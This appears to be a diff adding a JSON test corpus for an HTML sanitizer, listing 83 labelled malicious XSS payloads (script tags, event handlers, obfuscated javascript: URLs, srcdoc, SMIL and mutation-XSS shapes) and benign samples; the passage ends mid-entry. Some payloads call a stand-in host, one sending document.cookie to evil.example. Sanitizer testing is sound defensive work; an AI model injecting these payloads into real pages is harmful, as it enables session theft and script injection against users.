@@ -1,0 +1,1467 @@
+[
+ {
+  "id": "M01",
+  "label": "malicious",
+  "category": "script",
+  "html": "<p>Intro text.</p><script>alert(1)</script>",
+  "exec": "modern",
+  "note": "plain script"
+ },
+ {
+  "id": "M02",
+  "label": "malicious",
+  "category": "script",
+  "html": "<p>Intro text.</p><ScRiPt>alert(1)</sCrIpT>",
+  "exec": "modern",
+  "note": "mixed case"
+ },
+ {
+  "id": "M03",
+  "label": "malicious",
+  "category": "script",
+  "html": "<p>Intro text.</p><script type=\"text/javascript\" src=\"https://evil.example/x.js\" async defer></script>",
+  "exec": "modern",
+  "note": "external src with attributes"
+ },
+ {
+  "id": "M04",
+  "label": "malicious",
+  "category": "script",
+  "html": "<p>Intro text.</p><script type=\"module\">import(\"https://evil.example/m.js\")</script>",
+  "exec": "modern",
+  "note": "type=module"
+ },
+ {
+  "id": "M05",
+  "label": "malicious",
+  "category": "script",
+  "html": "<p>Intro text.</p><script type=\"text/plain\">alert(1)</script>",
+  "exec": "inert",
+  "note": "data block; not executed but stripped by policy"
+ },
+ {
+  "id": "M06",
+  "label": "malicious",
+  "category": "script",
+  "html": "<div><script\n>alert(1)</script\n></div>",
+  "exec": "modern",
+  "note": "newline inside tag"
+ },
+ {
+  "id": "M07",
+  "label": "malicious",
+  "category": "script",
+  "html": "<svg><script>alert(1)</script></svg>",
+  "exec": "modern",
+  "note": "svg script"
+ },
+ {
+  "id": "M08",
+  "label": "malicious",
+  "category": "script",
+  "html": "<p>x</p><script/src=\"https://evil.example/x.js\"></script>",
+  "exec": "modern",
+  "note": "slash separator"
+ },
+ {
+  "id": "M09",
+  "label": "malicious",
+  "category": "script",
+  "html": "<p>x</p><script type=\"application/javascript\">fetch(\"https://evil.example/?c=\"+document.cookie)</script>",
+  "exec": "modern",
+  "note": "application/javascript exfil"
+ },
+ {
+  "id": "M10",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<img src=\"x\" onerror=\"alert(1)\">",
+  "exec": "modern",
+  "note": "img onerror"
+ },
+ {
+  "id": "M11",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<svg onload=\"alert(1)\"></svg>",
+  "exec": "modern",
+  "note": "svg onload"
+ },
+ {
+  "id": "M12",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<div onclick=\"alert(1)\">click me</div>",
+  "exec": "modern",
+  "note": "onclick"
+ },
+ {
+  "id": "M13",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<div onmouseover=\"alert(1)\">hover me</div>",
+  "exec": "modern",
+  "note": "onmouseover"
+ },
+ {
+  "id": "M14",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<input autofocus onfocus=\"alert(1)\">",
+  "exec": "modern",
+  "note": "autofocus+onfocus"
+ },
+ {
+  "id": "M15",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<img src=\"x\" ONERROR=\"alert(1)\">",
+  "exec": "modern",
+  "note": "uppercase attr name"
+ },
+ {
+  "id": "M16",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<img src=\"x\" onerror\n=\"alert(1)\">",
+  "exec": "modern",
+  "note": "newline before ="
+ },
+ {
+  "id": "M17",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<img src=\"x\" onerror\t=\t\"alert(1)\">",
+  "exec": "modern",
+  "note": "tabs around ="
+ },
+ {
+  "id": "M18",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;1&#41;\">",
+  "exec": "modern",
+  "note": "entity-encoded value"
+ },
+ {
+  "id": "M19",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<img/src=\"x\"/onerror=\"alert(1)\">",
+  "exec": "modern",
+  "note": "slash separators"
+ },
+ {
+  "id": "M20",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<details open ontoggle=\"alert(1)\"><summary>x</summary></details>",
+  "exec": "modern",
+  "note": "ontoggle"
+ },
+ {
+  "id": "M21",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<a href=\"https://ok.example/\" onmousedown=\"alert(1)\">link</a>",
+  "exec": "modern",
+  "note": "handler on anchor"
+ },
+ {
+  "id": "M22",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<video><source onerror=\"alert(1)\" src=\"x\"></video>",
+  "exec": "modern",
+  "note": "source onerror"
+ },
+ {
+  "id": "M23",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<marquee onstart=\"alert(1)\">x</marquee>",
+  "exec": "modern",
+  "note": "marquee onstart"
+ },
+ {
+  "id": "M24",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<a href=\"https://example.com/\"><img src=\"x\" onerror=\"alert(1)\"></a>",
+  "exec": "modern",
+  "note": "img onerror inside anchor"
+ },
+ {
+  "id": "M25",
+  "label": "malicious",
+  "category": "handler",
+  "html": "<body onload=\"alert(1)\"><p>x</p>",
+  "exec": "modern",
+  "note": "body onload (merges into body)"
+ },
+ {
+  "id": "M26",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"javascript:alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "plain"
+ },
+ {
+  "id": "M27",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"JaVaScRiPt:alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "mixed case"
+ },
+ {
+  "id": "M28",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"jav&#x09;ascript:alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "entity tab inside scheme"
+ },
+ {
+  "id": "M29",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"java\nscript:alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "literal newline inside scheme"
+ },
+ {
+  "id": "M30",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"&#106;avascript:alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "decimal entity first letter"
+ },
+ {
+  "id": "M31",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"javascript&colon;alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "&colon; named entity"
+ },
+ {
+  "id": "M32",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"   javascript:alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "leading spaces"
+ },
+ {
+  "id": "M33",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"\u0000javascript:alert(1)\">click</a>",
+  "exec": "inert",
+  "note": "leading NUL: HTML tokenizer turns NUL into U+FFFD, so not executable from source"
+ },
+ {
+  "id": "M34",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<img src=\"javascript:alert(1)\">",
+  "exec": "inert",
+  "note": "img src javascript: does not run in modern browsers"
+ },
+ {
+  "id": "M35",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<form action=\"javascript:alert(1)\"><input type=\"submit\" value=\"go\"></form>",
+  "exec": "modern",
+  "note": "form action"
+ },
+ {
+  "id": "M36",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<form><input type=\"image\" formaction=\"javascript:alert(1)\" src=\"x\" alt=\"go\"></form>",
+  "exec": "modern",
+  "note": "input formaction"
+ },
+ {
+  "id": "M37",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<form><button formaction=\"javascript:alert(1)\">go</button></form>",
+  "exec": "modern",
+  "note": "button formaction"
+ },
+ {
+  "id": "M38",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">click</text></a></svg>",
+  "exec": "modern",
+  "note": "svg xlink:href"
+ },
+ {
+  "id": "M39",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<svg><a href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">click</text></a></svg>",
+  "exec": "modern",
+  "note": "svg href"
+ },
+ {
+  "id": "M40",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<iframe src=\"javascript:alert(1)\"></iframe>",
+  "exec": "modern",
+  "note": "iframe src"
+ },
+ {
+  "id": "M41",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"javascript://%0Aalert(1)\">click</a>",
+  "exec": "modern",
+  "note": "comment trick"
+ },
+ {
+  "id": "M42",
+  "label": "malicious",
+  "category": "js_url",
+  "html": "<a href=\"vbscript:MsgBox(1)\">click</a>",
+  "exec": "legacy",
+  "note": "vbscript (IE only)"
+ },
+ {
+  "id": "M43",
+  "label": "malicious",
+  "category": "js_url_obf",
+  "html": "<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "deep obf 1: full hex entities"
+ },
+ {
+  "id": "M44",
+  "label": "malicious",
+  "category": "js_url_obf",
+  "html": "<a href=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "deep obf 2: zero-padded decimal, no semicolons"
+ },
+ {
+  "id": "M45",
+  "label": "malicious",
+  "category": "js_url_obf",
+  "html": "<a href=\"&#x6A;av&#x61;&Tab;script&colon;&NewLine;alert&lpar;1&rpar;\">click</a>",
+  "exec": "modern",
+  "note": "deep obf 3: mixed named entities"
+ },
+ {
+  "id": "M46",
+  "label": "malicious",
+  "category": "js_url_obf",
+  "html": "<a href=\"\u000bjavascript:alert(1)\">click</a>",
+  "exec": "modern",
+  "note": "deep obf 4: leading vertical tab (C0 control stripped by URL parser)"
+ },
+ {
+  "id": "M47",
+  "label": "malicious",
+  "category": "js_url_obf",
+  "html": "<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x29;\" title=\"&#x72;&#x65;&#x61;&#x64;\">&#x6D;&#x6F;&#x72;&#x65;</a>",
+  "exec": "modern",
+  "note": "deep obf 5: everything hex-encoded incl. text"
+ },
+ {
+  "id": "M48",
+  "label": "malicious",
+  "category": "js_url_obf",
+  "html": "<a href=\"ｊavascript:alert(1)\">click</a>",
+  "exec": "inert",
+  "note": "fullwidth j: not a valid scheme"
+ },
+ {
+  "id": "M49",
+  "label": "malicious",
+  "category": "data_url",
+  "html": "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>",
+  "exec": "modern",
+  "note": "iframe data:text/html"
+ },
+ {
+  "id": "M50",
+  "label": "malicious",
+  "category": "data_url",
+  "html": "<iframe src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\"></iframe>",
+  "exec": "modern",
+  "note": "iframe data:image/svg+xml"
+ },
+ {
+  "id": "M51",
+  "label": "malicious",
+  "category": "srcdoc",
+  "html": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+  "exec": "modern",
+  "note": "srcdoc"
+ },
+ {
+  "id": "M52",
+  "label": "malicious",
+  "category": "srcdoc",
+  "html": "<iframe srcdoc=\"&lt;img src=x onerror=alert(1)&gt;\"></iframe>",
+  "exec": "modern",
+  "note": "srcdoc with entities"
+ },
+ {
+  "id": "M53",
+  "label": "malicious",
+  "category": "base",
+  "html": "<base href=\"https://evil.example/\"><a href=\"login\">login</a>",
+  "exec": "modern",
+  "note": "base href hijack"
+ },
+ {
+  "id": "M54",
+  "label": "malicious",
+  "category": "meta_refresh",
+  "html": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">",
+  "exec": "modern",
+  "note": "meta refresh navigation"
+ },
+ {
+  "id": "M55",
+  "label": "malicious",
+  "category": "meta_refresh",
+  "html": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+  "exec": "inert",
+  "note": "meta refresh javascript: blocked by browsers"
+ },
+ {
+  "id": "M56",
+  "label": "malicious",
+  "category": "data_url",
+  "html": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">open</a>",
+  "exec": "inert",
+  "note": "top-level data: navigation blocked in modern browsers"
+ },
+ {
+  "id": "M57",
+  "label": "malicious",
+  "category": "blob_url",
+  "html": "<iframe src=\"blob:https://example.com/5e4f1d7a-0000-4000-8000-000000000000\"></iframe>",
+  "exec": "modern",
+  "note": "iframe blob:"
+ },
+ {
+  "id": "M58",
+  "label": "malicious",
+  "category": "plugin",
+  "html": "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
+  "exec": "modern",
+  "note": "object data:"
+ },
+ {
+  "id": "M59",
+  "label": "malicious",
+  "category": "plugin",
+  "html": "<embed src=\"https://evil.example/x.swf\" type=\"application/x-shockwave-flash\">",
+  "exec": "legacy",
+  "note": "embed flash"
+ },
+ {
+  "id": "M60",
+  "label": "malicious",
+  "category": "plugin",
+  "html": "<applet code=\"Evil.class\" archive=\"https://evil.example/e.jar\"></applet>",
+  "exec": "legacy",
+  "note": "applet"
+ },
+ {
+  "id": "M61",
+  "label": "malicious",
+  "category": "plugin",
+  "html": "<embed src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\">",
+  "exec": "modern",
+  "note": "embed svg data (scripts run in embed)"
+ },
+ {
+  "id": "M62",
+  "label": "malicious",
+  "category": "plugin",
+  "html": "<object data=\"https://evil.example/x.svg\" type=\"image/svg+xml\"></object>",
+  "exec": "modern",
+  "note": "object remote svg"
+ },
+ {
+  "id": "M63",
+  "label": "malicious",
+  "category": "link_import",
+  "html": "<link rel=\"import\" href=\"https://evil.example/x.html\">",
+  "exec": "legacy",
+  "note": "HTML import (removed from browsers)"
+ },
+ {
+  "id": "M64",
+  "label": "malicious",
+  "category": "smil",
+  "html": "<svg><a href=\"#\"><animate attributeName=\"href\" values=\"javascript:alert(1)\" begin=\"0s\"/><text x=\"20\" y=\"20\">click</text></a></svg>",
+  "exec": "modern",
+  "note": "animate href"
+ },
+ {
+  "id": "M65",
+  "label": "malicious",
+  "category": "smil",
+  "html": "<svg><a><set attributeName=\"href\" to=\"javascript:alert(1)\"/><text x=\"20\" y=\"20\">click</text></a></svg>",
+  "exec": "modern",
+  "note": "set href"
+ },
+ {
+  "id": "M66",
+  "label": "malicious",
+  "category": "smil",
+  "html": "<svg><animateMotion dur=\"1s\" onbegin=\"alert(1)\" path=\"M0,0 L10,10\"/></svg>",
+  "exec": "modern",
+  "note": "animateMotion onbegin"
+ },
+ {
+  "id": "M67",
+  "label": "malicious",
+  "category": "svg_foreign",
+  "html": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+  "exec": "modern",
+  "note": "foreignObject script"
+ },
+ {
+  "id": "M68",
+  "label": "malicious",
+  "category": "svg_foreign",
+  "html": "<svg><foreignObject><img src=\"x\" onerror=\"alert(1)\"></foreignObject></svg>",
+  "exec": "modern",
+  "note": "foreignObject img onerror"
+ },
+ {
+  "id": "M69",
+  "label": "malicious",
+  "category": "mathml",
+  "html": "<math><maction actiontype=\"toggle\" href=\"javascript:alert(1)\"><mi>x</mi></maction></math>",
+  "exec": "modern",
+  "note": "MathML href (Firefox)"
+ },
+ {
+  "id": "M70",
+  "label": "malicious",
+  "category": "svg_use_data",
+  "html": "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIGlkPSd4Jz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#x\"/></svg>",
+  "exec": "inert",
+  "note": "use with data:image/svg (scripts do not run in use shadow tree)"
+ },
+ {
+  "id": "M71",
+  "label": "malicious",
+  "category": "style_import",
+  "html": "<svg><style>@import \"https://evil.example/x.css\";</style></svg>",
+  "exec": "modern",
+  "note": "svg style @import loads remote stylesheet"
+ },
+ {
+  "id": "M72",
+  "label": "malicious",
+  "category": "css",
+  "html": "<div style=\"background:url(javascript:alert(1))\">x</div>",
+  "exec": "legacy",
+  "note": "css url(javascript:)"
+ },
+ {
+  "id": "M73",
+  "label": "malicious",
+  "category": "css",
+  "html": "<div style=\"width:expression(alert(1))\">x</div>",
+  "exec": "legacy",
+  "note": "css expression()"
+ },
+ {
+  "id": "M74",
+  "label": "malicious",
+  "category": "css",
+  "html": "<style>body{background:url(\"https://evil.example/leak\")}</style><p>x</p>",
+  "exec": "modern",
+  "note": "style element remote fetch"
+ },
+ {
+  "id": "M75",
+  "label": "malicious",
+  "category": "template",
+  "html": "<template><script>alert(1)</script></template><p>x</p>",
+  "exec": "inert",
+  "note": "template content is inert until cloned"
+ },
+ {
+  "id": "M76",
+  "label": "malicious",
+  "category": "noscript",
+  "html": "<noscript><script>alert(1)</script></noscript><p>x</p>",
+  "exec": "inert",
+  "note": "noscript content is raw text when scripting on"
+ },
+ {
+  "id": "M77",
+  "label": "malicious",
+  "category": "mxss",
+  "html": "<svg><p><style><img src=\"x\" onerror=\"alert(1)\"></style></p></svg>",
+  "exec": "modern",
+  "note": "mXSS svg/p/style"
+ },
+ {
+  "id": "M78",
+  "label": "malicious",
+  "category": "mxss",
+  "html": "<math><mtext><table><mglyph><style><img src=\"x\" onerror=\"alert(1)\"></style></mglyph></table></mtext></math>",
+  "exec": "modern",
+  "note": "mXSS math/mtext/table/mglyph/style"
+ },
+ {
+  "id": "M79",
+  "label": "malicious",
+  "category": "mxss",
+  "html": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
+  "exec": "modern",
+  "note": "mXSS noscript title breakout"
+ },
+ {
+  "id": "M80",
+  "label": "malicious",
+  "category": "mxss",
+  "html": "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\"></style></svg>",
+  "exec": "modern",
+  "note": "mXSS DOMPurify 2.0.0 shape"
+ },
+ {
+  "id": "M81",
+  "label": "malicious",
+  "category": "mxss",
+  "html": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
+  "exec": "modern",
+  "note": "mXSS nested form shape"
+ },
+ {
+  "id": "M82",
+  "label": "malicious",
+  "category": "mxss",
+  "html": "<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></desc></svg>",
+  "exec": "modern",
+  "note": "CDATA escape"
+ },
+ {
+  "id": "M83",
+  "label": "malicious",
+  "category": "mxss",
+  "html": "<!--><img src=\"x\" onerror=\"alert(1)\">--><p>x</p>",
+  "exec": "modern",
+  "note": "abrupt comment close"
+ },
+ {
+  "id": "B01",
+  "label": "benign",
+  "category": "article",
+  "html": "<article><h1>Why we rewrote the parser</h1><p>Last spring the team decided the old parser could not keep up. This post explains what changed and why.</p><p>The rewrite took three months and shipped behind a flag.</p></article>",
+  "exec": "none",
+  "keep": [
+   "rewrote the parser",
+   "three months"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B02",
+  "label": "benign",
+  "category": "article",
+  "html": "<p>See the <a href=\"https://example.com/post/42\">original announcement</a> and the <a href=\"https://example.com/docs\">documentation</a> for details.</p>",
+  "exec": "none",
+  "keep": [
+   "href=\"https://example.com/post/42\"",
+   "documentation"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B03",
+  "label": "benign",
+  "category": "article",
+  "html": "<blockquote><p>Simplicity is prerequisite for reliability.</p><cite>A well-known computer scientist</cite></blockquote>",
+  "exec": "none",
+  "keep": [
+   "Simplicity is prerequisite"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B04",
+  "label": "benign",
+  "category": "article",
+  "html": "<ol><li>Install the package</li><li>Run the migration</li><li>Restart the service</li></ol>",
+  "exec": "none",
+  "keep": [
+   "Run the migration"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B05",
+  "label": "benign",
+  "category": "article",
+  "html": "<table><thead><tr><th>Version</th><th>Date</th></tr></thead><tbody><tr><td>1.0</td><td>2024-01-10</td></tr><tr><td>1.1</td><td>2024-03-02</td></tr></tbody></table>",
+  "exec": "none",
+  "keep": [
+   "2024-03-02"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B06",
+  "label": "benign",
+  "category": "article",
+  "html": "<figure><img src=\"https://example.com/images/plot.png\" alt=\"Latency plot\" width=\"800\" height=\"400\"><figcaption>Figure 1: p99 latency over time.</figcaption></figure>",
+  "exec": "none",
+  "keep": [
+   "plot.png",
+   "p99 latency"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B07",
+  "label": "benign",
+  "category": "article",
+  "html": "<h2>Background</h2><p>Some context.</p><hr><h3>Details</h3><p>More context here, spanning two sentences. It ends here.</p>",
+  "exec": "none",
+  "keep": [
+   "Background",
+   "More context here"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B08",
+  "label": "benign",
+  "category": "article",
+  "html": "<ul><li>Fruit<ul><li>Apple</li><li>Pear</li></ul></li><li>Vegetables</li></ul>",
+  "exec": "none",
+  "keep": [
+   "Pear"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B09",
+  "label": "benign",
+  "category": "article",
+  "html": "<p>Use <em>emphasis</em> sparingly, <strong>bold</strong> rarely, and <code>monospace</code> for identifiers.</p>",
+  "exec": "none",
+  "keep": [
+   "monospace"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B10",
+  "label": "benign",
+  "category": "article",
+  "html": "<p>Published <time datetime=\"2024-01-01\">January 1, 2024</time> by the editorial team.</p>",
+  "exec": "none",
+  "keep": [
+   "January 1, 2024"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B11",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>",
+  "exec": "none",
+  "keep": [
+   "&lt;script&gt;alert(1)&lt;/script&gt;"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B12",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code class=\"language-html\">&lt;img src=x onerror=alert(1)&gt;</code></pre>",
+  "exec": "none",
+  "keep": [
+   "&lt;img src=x onerror=alert(1)&gt;"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B13",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<p>Avoid <code>&lt;a href=\"javascript:void(0)\"&gt;</code>; use a button instead.</p>",
+  "exec": "none",
+  "keep": [
+   "javascript:void(0)"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B14",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code>&lt;iframe srcdoc=\"&amp;lt;p&amp;gt;hi&amp;lt;/p&amp;gt;\"&gt;&lt;/iframe&gt;</code></pre>",
+  "exec": "none",
+  "keep": [
+   "srcdoc="
+  ],
+  "note": ""
+ },
+ {
+  "id": "B15",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<table><tr><th>Event</th><th>Fires when</th></tr><tr><td><code>onerror</code></td><td>a resource fails to load</td></tr><tr><td><code>onload</code></td><td>loading finishes</td></tr></table>",
+  "exec": "none",
+  "keep": [
+   "<code>onerror</code>"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B16",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code>button.addEventListener(\"click\", () =&gt; alert(\"hi\"));</code></pre>",
+  "exec": "none",
+  "keep": [
+   "addEventListener"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B17",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code>&lt;svg&gt;&lt;animate attributeName=\"href\" values=\"javascript:alert(1)\"/&gt;&lt;/svg&gt;</code></pre>",
+  "exec": "none",
+  "keep": [
+   "&lt;animate attributeName"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B18",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code>&lt;meta http-equiv=\"refresh\" content=\"5;url=/home\"&gt;</code></pre>",
+  "exec": "none",
+  "keep": [
+   "&lt;meta http-equiv"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B19",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<p>Wrap it in backticks like `&lt;script src=\"app.js\"&gt;` so Markdown renders it literally.</p>",
+  "exec": "none",
+  "keep": [
+   "`&lt;script src=\"app.js\"&gt;`"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B20",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code class=\"language-python\">print(\"&lt;b&gt;bold&lt;/b&gt;\")</code></pre>",
+  "exec": "none",
+  "keep": [
+   "&lt;b&gt;bold"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B21",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<div class=\"highlight\"><pre class=\"chroma\"><code><span class=\"line\"><span class=\"cl\"><span class=\"p\">&lt;</span><span class=\"nt\">script</span><span class=\"p\">&gt;</span></span></span>\n<span class=\"line\"><span class=\"cl\">  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"ready\"</span><span class=\"p\">)</span></span></span>\n<span class=\"line\"><span class=\"cl\"><span class=\"p\">&lt;/</span><span class=\"nt\">script</span><span class=\"p\">&gt;</span></span></span></code></pre></div>",
+  "exec": "none",
+  "keep": [
+   "console",
+   "&lt;"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B22",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code class=\"language-bash\">curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com/v1/items</code></pre>",
+  "exec": "none",
+  "keep": [
+   "api.example.com/v1/items"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B23",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code>&lt;object data=\"movie.swf\" type=\"application/x-shockwave-flash\"&gt;&lt;/object&gt;</code></pre>",
+  "exec": "none",
+  "keep": [
+   "&lt;object data"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B24",
+  "label": "benign",
+  "category": "escaped_code",
+  "html": "<pre><code>&lt;base href=\"https://example.com/\"&gt;</code></pre>",
+  "exec": "none",
+  "keep": [
+   "&lt;base href"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B25",
+  "label": "benign",
+  "category": "xss_prose",
+  "html": "<p>Cross-site scripting (XSS) happens when an attacker injects a script tag or an onerror handler into a page that other users view.</p>",
+  "exec": "none",
+  "keep": [
+   "Cross-site scripting"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B26",
+  "label": "benign",
+  "category": "xss_prose",
+  "html": "<p>Never allow javascript: URLs in href attributes; strip them before rendering user content.</p>",
+  "exec": "none",
+  "keep": [
+   "javascript: URLs"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B27",
+  "label": "benign",
+  "category": "xss_prose",
+  "html": "<p>The srcdoc attribute lets an iframe render inline HTML, which is why sanitizers remove it.</p>",
+  "exec": "none",
+  "keep": [
+   "srcdoc attribute"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B28",
+  "label": "benign",
+  "category": "xss_prose",
+  "html": "<p>Older versions of Internet Explorer supported expression() in CSS, which could run arbitrary code.</p>",
+  "exec": "none",
+  "keep": [
+   "expression()"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B29",
+  "label": "benign",
+  "category": "xss_prose",
+  "html": "<p>Attackers sometimes write \"on-error\" or \"java script\" with extra characters to dodge naive keyword filters.</p>",
+  "exec": "none",
+  "keep": [
+   "on-error"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B30",
+  "label": "benign",
+  "category": "xss_prose",
+  "html": "<p>Our sanitizer removes &lt;object&gt;, &lt;embed&gt; and &lt;applet&gt; elements and every SMIL animation element.</p>",
+  "exec": "none",
+  "keep": [
+   "&lt;embed&gt;"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B31",
+  "label": "benign",
+  "category": "xss_prose",
+  "html": "<h2>How meta refresh works</h2><p>A meta refresh tag tells the browser to reload or navigate after a number of seconds. It predates JavaScript redirects.</p>",
+  "exec": "none",
+  "keep": [
+   "meta refresh tag"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B32",
+  "label": "benign",
+  "category": "xss_prose",
+  "html": "<p>The payload <code>&lt;svg onload=alert(1)&gt;</code> is the classic test string from the cheat sheet.</p>",
+  "exec": "none",
+  "keep": [
+   "&lt;svg onload=alert(1)&gt;"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B33",
+  "label": "benign",
+  "category": "embed",
+  "html": "<iframe src=\"https://www.youtube.com/embed/dQw4w9WgXcQ\" width=\"560\" height=\"315\" allowfullscreen></iframe>",
+  "exec": "none",
+  "keep": [
+   "youtube.com/embed/dQw4w9WgXcQ"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B34",
+  "label": "benign",
+  "category": "embed",
+  "html": "<iframe src=\"https://player.vimeo.com/video/123456\" sandbox=\"allow-scripts allow-same-origin\"></iframe>",
+  "exec": "none",
+  "keep": [
+   "player.vimeo.com",
+   "sandbox="
+  ],
+  "note": ""
+ },
+ {
+  "id": "B35",
+  "label": "benign",
+  "category": "media",
+  "html": "<img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==\" alt=\"one pixel\">",
+  "exec": "none",
+  "keep": [
+   "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
+  ],
+  "note": ""
+ },
+ {
+  "id": "B36",
+  "label": "benign",
+  "category": "media",
+  "html": "<img src=\"https://example.com/photo.jpg\" alt=\"onerror=alert(1)\">",
+  "exec": "none",
+  "keep": [
